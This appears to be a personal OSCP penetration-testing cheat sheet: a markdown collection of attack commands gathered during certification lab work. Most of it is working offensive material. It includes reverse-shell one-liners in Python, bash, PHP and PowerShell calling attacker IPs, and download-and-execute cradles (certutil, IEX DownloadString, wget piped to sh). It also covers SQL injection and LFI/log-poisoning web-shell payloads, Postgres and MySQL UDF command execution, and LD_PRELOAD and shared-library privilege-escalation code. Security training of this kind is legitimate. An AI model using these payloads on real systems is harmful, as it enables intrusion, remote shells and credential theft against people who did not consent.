# YOU WILL PASS THE OSCP
 # GENERAL
##### Lemmie upgrade you
 ```bash
Upgrade $ /bin/sh to full /bin/bash shell
python -c "import pty;pty.spawn('/bin/bash')"
python3 -c "import pty;pty.spawn('/bin/bash')"
```
##### wget in ram
```bash
Wget -O - http://192.168.49.66/linpeas.sh | sh
```
##### Samba Enumeration 
```bash
sudo ngrep -i -d tun0 's.?a.?m.?b.?a.*[[:digit:]]' port 139 
 ```
##### SSH w0nT C0nN3cT
```bash
-oKexAlgorithms=+diffie-hellman-group1-sha1
```
##### Hydra easy
```bash
hydra -l bethany -P /usr/share/wordlists/rockyou.txt -s 9505 -f 10.11.1.50 http-get /~login -V -I
```
##### WP easy
```bash
https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1
wpscan --usernames admin -P /usr/share/wordlists/rockyou.txt --force --password-attack wp-login --url http://192.168.XXX.XXX
```
##### VPN Trouble shooting
```bash
sudo nano /etc/resolv.conf
sudo NetworkManager restart
```
##### SMBSUCKS Try this
```bash
smbclient //MOUNT/Yourmomma -I 192.168.154.55 -N
```
# SQLi 
##### Oracle
```bash
http://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html
````
```bash
'order by 1--
all the way up to 10
'order by 10--
'union select 1,2,3,4,5,6,7,8,9 from dual--
'union select null,null,null,null,null,null,null,null,null from dual--
````
```bash
'union select '1111',null,null,null,null,null,null,null,null from dual--
'union select null,'2222',null,null,null,null,null,null,null from dual--
````
```bash
'union select null,ora.database_name,null,null,null,null,null,null,null from dual--
'union select null,user,null,null,null,null,null,null,null from dual--
'union select null,(select banner from v$version where rownum=1),null,null,null,null,null,null,null from dual--
````
```bash
'union select null,table_name,null,null,null,null,null,null,null from all_tables--
'union select null,column_name,null,null,null,null,null,null,null from all_tab_columns where table_name='user_table'--
'union select null,username||password,null,null,null,null,null,null,null from user_table--
````
##### SWQLi MS SQL Error based
```bash
https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/
````
```bash
I had to edit the syntax to create the error but it needed a ', to balance it.


',convert(INT,(CHAR(58)+(SELECT DISTINCT top 2 TABLE_NAME FROM (SELECT DISTINCT top 1 TABLE_NAME FROM archive.information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58))))--
',convert(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top 1 column_name FROM archive.information_schema.COLUMNS WHERE TABLE_NAME='pmanager' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58))))--
',convert(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM [archive]..[pmanager] )+CHAR(58)+CHAR(58))))--
',convert(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 psw FROM (SELECT top 1 psw FROM archive..pmanager ORDER BY psw ASC) sq ORDER BY psw DESC)+CHAR(58)+CHAR(58))))—
````
```

# SQL General 
```bash
POSTGRES
postgres=# \c postgres;
psql (12.2 (Debian 12.2-1+b1), server 11.7 (Debian 11.7-0+deb10u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "postgres" as user "postgres".
postgres=# DROP TABLE IF EXISTS cmd_exec;
NOTICE:  table "cmd_exec" does not exist, skipping
DROP TABLE
postgres=# CREATE TABLE cmd_exec(cmd_output text);
CREATE TABLE
postgres=# COPY cmd_exec FROM PROGRAM 'wget http://192.168.234.30/nc';
COPY 0
postgres=# DELETE FROM cmd_exec;
DELETE 0
postgres=# COPY cmd_exec FROM PROGRAM 'nc -n 192.168.234.30 5437 -e /usr/bin/bash';

```

# LIF/RFI 
```bash
=/etc/passwd
LFI with Path Traversal
=../../../../../../../../../etc/passwd

Prefixing a / before the payload will bypass the filename and traverse directories instead.
=/../../../../../etc/passwd

LFI with Blacklisting
=....//....//....//....//....//....//....//....//etc/passwd

Bypass with URL Encoding
%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd

Source Code Disclosure via PHP Wrappers config.php
=php://filter/read=convert.base64-encode/resource=config
echo 'PD9waHAKCiRjb2..." | base64 -d

Extension Bypass Using Null Byte
When it is adding .php on the end...get rid of it with a null byte >>> include("/etc/passwd%00.php")
/etc/passwd\x00
````
##### RCE through Apache / Nginx Log Files
````
=/var/log/apache2/access.log
Change the User-Agent header to test Log Posioning >>> BRUISER HAXXXXX
Now change it to <?php system($_GET['cmd']); ?>
=/var/log/apache2/access.log&cmd=whoami
````
##### RCE through PHP Session Files
````
This path is dictated by the session.save_path configuration variable, which is empty by default.
Linux: /var/lib/php/sessions/
Windows: C:\Windows\Temp
Identified from the PHPSESSID cookie >>> nhhv8i0o6ua4g88bkdl9u1fdsd
Location on disk would be /var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
=session_poisoning
=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
=<?php system($_GET['cmd']); ?>
=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
````
##### WINDOWS PHP RFI
```bash
nc -nv 192.168.136.10 80
    <?php echo shell_exec($_GET[‘cmd’]);?>
192.168.136.10/menu.php?file=c:/xampp/apache/logs/access.log&cmd=powershell%20IEX%20((New-Object%20Net.WebClient).DownloadString(%27http://192.168.119.136/shell%27))
http://192.168.136.10/menu.php?file=data:text/plain,%3C?php%20echo%20shell_exec(%22powershell%20IEX%20((New-Object%20Net.WebClient).DownloadString(%27http://192.168.119.136/shell%27))%22)%20?%3E
```
##### Other PHP Wrappers
````
expect wrapper is disabled by default but can prove very useful if enabled
=expect://id

data wrapper can be used to include external data
Apache: /etc/php/X.Y/apache2/php.ini
php-fpm used by Nginx: /etc/php/X.Y/fpm/php.ini
echo '<?php system($_GET['cmd']); ?>' | base64
  PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=
=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id

input wrapper can be used to include external input and execute code. It also needs the allow_url_include setting enabled
The following curl command sends a POST request with a system command and then includes it using php://input, which gets executed by the page.
curl -s -X POST --data "<?php system('id'); ?>" "http://134.209.184.216:30084/index.php?language=php://input" | grep uid

zip wrapper can prove useful in combination with file uploads
apt install phpX.Y-zip
Byron@htb[/htb]$ echo '<?php system($_GET['cmd']); ?>' > exec.php
Byron@htb[/htb]$ zip malicious.zip exec.php
Byron@htb[/htb]$ rm exec.php
copy malicious.zip to the webroot to simulate the upload. The files in the zip archive can be referenced using the # symbol
which should be URL-encoded in the request. For example, the URL below can be used to include exec.php and then execute code using the cmd parameter
=zip://malicious.zip%23exec.php&cmd=id
````
```bash
## LFI/RFI
Exploiting PHP File Inclusion – Overview
https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/

Add %00 to test if the file is adding .php to the filename < before php version 5.3
Add ? to act as another parameter

include will execute the file. Others will not

## Local File inclusion
$file = $_GET['page'];
require($file);

check with files that generally can be accessed
/etc/passwd
/etc/hostname
/etc/hosts

read php file
php://filter/convert.base64-encode/resource=<file name/Path> e.g. index
echo "<output>" |base64 -d

.htaccess
config.php in web root folder?

root/user ssh keys? .bash_history?
/.ssh/id_rsa
/.ssh/id_rsa.keystore
/.ssh/id_rsa.pub
/.ssh/authorized_keys
/.ssh/known_hosts

php Wrapper  
expect://<command>  

page=php://input&cmd=ls  
in POST request  
<?php echo shell_exec($GET_['cmd']);?>  

Upload Zip shell file and extract with zip  
zip://path/to/file.zip%23shell  
zip://path/to/file.zip%23shell.php  

Check current running user  
/proc/self/status  
check uid and gid  

### Log Poisoning  
https://wiki.apache.org/httpd/DistrosDefaultLayout  
**Common log file location**  
**Ubuntu, Debian**  
/var/log/apache2/error.log  
/var/log/apache2/access.log  

**Red Hat, CentOS, Fedora, OEL, RHEL**  
/var/log/httpd/error_log  
/var/log/httpd/access_log  
  
**FreeBSD**  
/var/log/httpd-error.log  
/var/log/httpd-access.log  

**Common Config file location**  
check any restriction or hidden path on accessing the server  

**Ubuntu**  
/etc/apache2/apache2.conf  

/etc/apache2/httpd.conf  
/etc/apache2/apache2.conf  
/etc/httpd/httpd.conf  
/etc/httpd/conf/httpd.conf  

**FreeBSD**  
/usr/local/etc/apache2/httpd.conf  

Hidden site?  
/etc/apache2/sites-enabled/000-default.conf  

proc/self/environ  
https://www.exploit-db.com/papers/12886/  
/proc/self/environ  

### SSH log posioning  
http://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/  

### Mail log  
telnet <IP> 25  
EHLO <random character>  

VRFY <user>@localhost  

mail from:attacker@attack.com  
rcpt to: <user>@localhost  
data  

Subject: title  
<?php echo system($_REQUEST['cmd']); ?>  

<end with .>  

LFI /var/mail/<user>  

## Remote File Inclusion  
requires allow_url_fopen=On and allow_url_include=On  

$incfile = $_REQUEST["file"];  
include($incfile.".php");  
```

#  POWERSHELL
```bash
Set-ExecutionPolicy Unrestricted
PS C:\> Get-Childitem "C:\*\findme*" -Recurse
tree /f or tree /a
````
##### ONE LINER 
````
$client = New-Object System.Net.Sockets.TCPClient("192.168.119.136",8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
````
##### Downloads (FILE)
````
powershell -c IEX "(new-object System.Net.WebClient).DownloadFile('http://192.168.119.136/Juicy.Potato.x86.exe','C:\Users\jill\Desktop\Juicy.Potato.x86.exe')"
powershell -c IEX "(new-object System.Net.WebClient).DownloadFile('http://192.168.119.136/nc.exe','C:\Users\jill\Desktop\nc.exe')"
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.119.136/winPEASany.exe','C:\Users\winPEASany.exe')"
powershell -c IEX "(new-object System.Net.WebClient).DownloadFile('http://192.168.119.136/mimikatz.exe','C:\mimikatz.exe')"
````
##### Downloads (Memory)
````
C:\Windows\system32>powershell -c iex (New-Object System.Net.Webclient).DownloadString('http://192.168.119.136/PowerView.ps1')

powershell -c iex (New-Object System.Net.Webclient).DownloadString('http://192.168.119.136/Invoke-PowerShellTcp.ps1')
powershell -c iex (New-Object System.Net.Webclient).DownloadString('http://192.168.119.136/Invoke-PowerShellTcp8888.ps1')

````
##### SysNative 32bit to 64
````
cd C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe
%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe

````
##### 64 bit / 32 bit
```bash
[Environment]::Is64BitProcess

if you happen to get unto an ancient windows machine that needs to execute 32 bit binaries its....
[7:55 PM]
32-bit (x86) PowerShell executable     %SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
64-bit (x64) Powershell executable     %SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe
32-bit (x86) Powershell ISE executable     %SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe
64-bit (x64) Powershell ISE executable     %SystemRoot%\system32\WindowsPowerShell\v1.0\powershell_ise.exe
```

# REVERSE SHELLS
### THE ONELINER PYTHON ***GOLDEN***
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.226",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

***NOTE: I have gotten the follwing little script to run if its a python cron.
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.66",8003));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
````
```bash
PHP 
<?php $cmd = shell_exec('bash -i >& /dev/tcp/192.168.119.155/4444 0>&1'); echo $cmd;?> 
<?php $cmd = shell_exec('cmd /c \\192.168.119.155\test\nc.exe -e cmd.exe 192.168.119.155 4444'); echo $cmd;?> 

LINUX
bash -i >& /dev/tcp/192.168.119.136/4444 0>&1  
mkfifo /tmp/f2;cat /tmp/f2|/bin/sh -i |nc 192.168.119.155 4444 >/tmp/f2 
nc -e /bin/bash 192.168.119.1136 4444
/bin/sh -i 2>&1|nc 192.168.119.136 80

WINDOWS
certutil -urlcache -f http://192.168.119.136/nc.exe nc.exe & nc.exe -e cmd.exe 192.168.119.155 4444
certutil -urlcache -f http://192.168.119.155/shell.exe shell.exe & shell.exe
powershell -exec bypass -c "iex(New-Object Net.WebClient).DownloadString('http://192.168.119.136/Invoke-PowerShellTcp.ps1')"
powershell -exec bypass -c "iwr('http://192.168.119.136/Invoke-PowerShellTcp.ps1')|iex"
```
# MSFVENOM 
```bash
Unstaged
msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf  
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe 

```

# BUFFER OVERFLOW 
```bash
!mona config -set workingfolder c:\mona\bruiser
!mona findmsp -distance 600
!mona bytearray -b "\x00"
!mona compare -f C:\mona\bruiser\bytearray.bin -a esp
!mona jmp -r esp -cpb "\x00"
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000

MATCH YOUR PAYLOAD LANGUAGE WITH THE LANGUAGE OF THE PROGRAM RUNNING (WINDOWS IS PROBABLY RUNNING C)
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\
msfvenom -p windows/shell_reverse_tcp LHOST=10.6.41.12 LPORT=4444 EXITFUNC=thread -b "\x00" -f py
```

# LINUX PRIVESC
##### List Current Processes
```bash
ps aux | grep root
ps au
```
##### Check out the the user, home dir and history
```bash
ls -la /home/winston
history
sudo -l
ls -la /etc/cron.daily/
lsblk
```
##### Writeable dirs or files?
```bash
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```
##### What am I on?
```bash
uname -a
cat /etc/lsb-release
```
#### Simple kerenel expoit with gcc
```bash
gcc kernel_expoit.c -o kernel_expoit && chmod +x kernel_expoit
```
##### pspy
```bash
https://github.com/DominicBreuker/pspy
./pspy64 -pf -i 1000
```
##### Set User ID BIT
```bash
The Set User ID upon Execution (setuid) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges. The setuid bit appears as an s.
find / -user root -perm -4000 -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
or by group
find / -uid 0 -perm -6000 -type f 2>/dev/null
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```
##### Check the front door
```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
sudo -l (Find what user can execute without a pass and) search the man to use -postrotate-command option.
ex: sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```
##### Path Abuse
```bash
check the contents of the PATH variable
env | grep PATH
echo $PATH
```
##### Cred Hunting
```bash
cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
for spool or mail directories
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
ls ~/.ssh
```
##### LD_PRELOAD Privilege Escalation
```bash
sudo -l, see apache2 runs /usr/sbin/apache2
compile the root.c exploit
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
gcc -fPIC -shared -o root.so root.c -nostartfiles
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```
##### Share Object Hijacking
```bash
htb_student@NIX02:~$ ls -la payroll
-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
ldd to print the shared object required by a binary or shared object.

htb_student@NIX02:~$ ldd payroll

linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)

htb_student@NIX02:~$ readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]

writeable
htb_student@NIX02:~$ ls -la /development/

total 8
drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./
drwxr-xr-x 23 root root 4096 Sep  1 21:26 ../

Before compiling a library, we need to find the function name called by the binary.
htb_student@NIX02:~$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so

htb_student@NIX02:~$ ldd payroll

linux-vdso.so.1 (0x00007ffd22bbc000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)

htb_student@NIX02:~$ ./payroll 
./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery

#include<stdio.h>
#include<stdlib.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 

gcc src.c -fPIC -shared -o /development/libshared.so
```
##### Privileged Groups
```bash
LXC/LXD
devops@NIX02:~$ unzip alpine.zip 
devops@NIX02:~$ lxd init
devops@NIX02:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
devops@NIX02:~$ lxc init alpine r00t -c security.privileged=true
devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
devops@NIX02:~$ lxc start r00t

DOCKER
Members of the docker group can spawn new docker containers
docker run -v /root:/mnt -it ubuntu
browse to the mounted directory and retrieve or add SSH keys for the root user
/etc which could be used to retrieve the contents of the /etc/shadow file 
for offline password cracking or adding a privileged user

DISK
Users within the disk group have full access to any devices contained within /dev, such as /dev/sda1, 
which is typically the main device used by the operating system.
debugfs to access the entire file system with root level privileges

ADM
adm group are able to read all logs stored in /var/log.
gather sensitive data stored in log files or enumerate user actions and running cron jobs.

finging the groups
find / -group groupx 2>/dev/null
```
### Kernel Exploits
```bash
Ubuntu 16.04.4 kernel priv esc - https://vulners.com/zdt/1337DAY-ID-30003
Screen Version 4.5.0 
```

# WINDOWS PRIVESC 
```bash
windows 7
. .\Juicy.Potato.x86.exe -l 7777 -p c:\windows\system32\cmd.exe -a "/c C:\Users\jill\desktop\nc.exe -e cmd.exe 192.168.119.136 5555" -t * -c "{03ca98d6-ff5d-49b8-abc6-03dd84127020}"

sudo nc -lnvp 443 > receiving_powercat.ps1
powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
Reverse shell
powercat -c 10.11.0.4 -p 443 -e cmd.exe
Bind shell
powercat -l -p 443 -e cmd.exe
Base 64 the payload to get across a net
powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
powershell.exe -E  (To run and decode the payload)

```

# Compile 
```bash
UBUNTU
sudo nano /etc/apt/sources.list
replace all the current us >>> old-releases
  example deb http://old-releases.ubuntu.com/ubuntu/
sudo apt-get update
sudo apt-get install gcc
*I installed some extra stuff*
sudo apt-get install libsctp-dev

sudo apt install default-libmysqlclient-dev default-libmysqld-dev
After you've finished compiling, run "file <compiled file name>". Is the file shown as a 32 bit or 64 bit binary? If it's still 64 bit even after using the -m32 flag you can try "sudo apt install gcc-multilib". Then run gcc -m32 -Wl,--hash-style=both -o outputfile inputfile.c 

```

# SSH Tunneling
```bash
ssh -f -N -R 8000:10.3.3.14:80 -R 4443:10.3.3.14:443 -R 33306:10.3.3.14:3306 -R 33389:10.3.3.14:3389  -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i key kali@192.168.19.57
# kill with
ps -C ssh
kill -9 <pid>

# SSH local port forward to reach  an_internal_server_ip:port via server_ip
ssh tunneler@server_ip -p 2222 -L 1234:an_internal_server_ip:80 
# Now curl localhost:1234 will fetch an_internal_server_ip:80 which is reachable from server_ip only

# dynamic port forward to create a SOCKS proxy to visit any_internal_server_ip
ssh tunneler@server_ip -p 2222 -D 1080 
# next config proxychains socks4a localhost 1080; proxychains curl http://any_internal_server_ip/; which is reachable from server_ip only

# ProxyJump ssh to an_internal_host via ssh server_ip
ssh -J tunneler@server_ip:2222 whistler@an_internal_host # which is only accessible from server_ip

# SSH remote port forward to send traffic back to our local port from a port of server_ip
ssh whistler@server_ip -p 2222 -L 58671:localhost:1234 # 
# this will listen on port 58671 of server_ip and tunnel the traffic back to us on loclahost:1234; nc -nlvp 1234 to receive for example

# Chain ProxyJump + dynamic port forward to create a proxy of 2nd_box which is only accessible via 1st_box
ssh -j firstuser@1st_box:2222 seconduser@2nd_box -D 1080
# next config proxychains socks4a localhost 1080; proxychains curl http://any_internal_server_ip/; which is reachable from 2nd_box only

# bypass first time prompt when have non-interactive shell

ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" ...
```
# SMTP
```bash
└─$ nc -nv 192.168.114.56 25                                                                                                                                            1 ⨯
(UNKNOWN) [192.168.114.56] 25 (smtp) open
220 banzai.offseclabs.com ESMTP Postfix (Debian/GNU)
ehlo you
250-banzai.offseclabs.com
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250 SMTPUTF8
vrfy banazai
550 5.1.1 <banazai>: Recipient address rejected: User unknown in local recipient table
vrfy banzai
252 2.0.0 banzai
```
# Shellshock
```
PHP 5.* is on and CGI.bin is 200 we can shellshock
```
# MYSQL version 5
```bash
It is vulnerable to raptor or another .so from rapid 7's Github.
https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql
MYSQL does not have xp_cmdshell; But we can make one if it is vuln
Pull the correct arch x86 or x64
Set 777 perm
mysql> SELECT VERSION();
SELECT VERSION();
+-----------+
| VERSION() |
+-----------+
| 5.7.30    |
+-----------+
1 row in set (0.00 sec)

Pick a db
mysql> use mysql                 
use mysql

mysql> create table bruiser(line blob);
create table bruiser(line blob);
Query OK, 0 rows affected (0.01 sec)

mysql> insert into bruiser values(load_file('/var/www/html/lib_mysqludf_sys_64.so'));
insert into bruiser values(load_file('/var/www/html/lib_mysqludf_sys_64.so'));
Query OK, 1 row affected (0.00 sec)

mysql> select * from bruiser into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys_64.so';
select * from bruiser into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys_64.so';
Query OK, 1 row affected (0.01 sec)

mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys_64.so';
create function sys_exec returns integer soname 'lib_mysqludf_sys_64.so';
Query OK, 0 rows affected (0.00 sec)

mysql> select sys_exec('nc 192.168.49.66 22 -e /bin/bash');
select sys_exec('nc 192.168.49.66 22 -e /bin/bash');

***Note: I was only able to get a connection with the above syntax. It needs to be in that order for it to connect.***
***Note: /bin/sh works AND this did too... select sys_exec('nc -e /bin/bash 192.168.49.66 21');
***UPDATE: You cant split the command -e in the front and /bin/sh at the back. Pick front load or backload.
```

# LINUX KERNEL EXPLOITS
```bash
Linux version 2.6.32-21-generic (buildd@rothera) (gcc version 4.4.3 (Ubuntu 4.4.3-4ubuntu5) ) #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010                                          Distributor ID: Ubuntu
Description:    Ubuntu 10.04.3 LTS
Release:        10.04
2.6.37 (RedHat / Ubuntu 10.04) - 'Full-Nelson.c' Local Privilege Escalation | linux/local/15704.c

www-data@offsecsrv:/tmp$ ./NO*
./NO*
[*] Resolving kernel addresses...
 [+] Resolved econet_ioctl to 0xf82032d0
 [+] Resolved econet_ops to 0xf82033c0
 [+] Resolved commit_creds to 0xc016dcc0
 [+] Resolved prepare_kernel_cred to 0xc016e000
[*] Calculating target...
[*] Triggering payload...
[*] Got root!
# cd /root

Success:
===============================
=          Mempodipper        =
=           by zx2c4          =
=         Jan 21, 2012        =
===============================
OS: Linux version 3.0.0-12-server (buildd@crested) (gcc version 4.6.1 (Ubuntu/Linaro 4.6.1-9ubuntu3) ) #20-Ubuntu SMP Fri Oct 7 16:36:30 UTC 2011
Distributor ID: Ubuntu
Description:    Ubuntu 11 LTS
Release:        11
Memodripper https://www.kernel-exploits.com/media/memodipper.c
x64 on Kali worked natty. x86 on my Ubuntu was not reconized. Makes sense.

```
# Python Errors
```bash
SyntaxError: invalid non-printable character U+200B
sed 's/\xe2\x80\x8b//g' inputfile
```
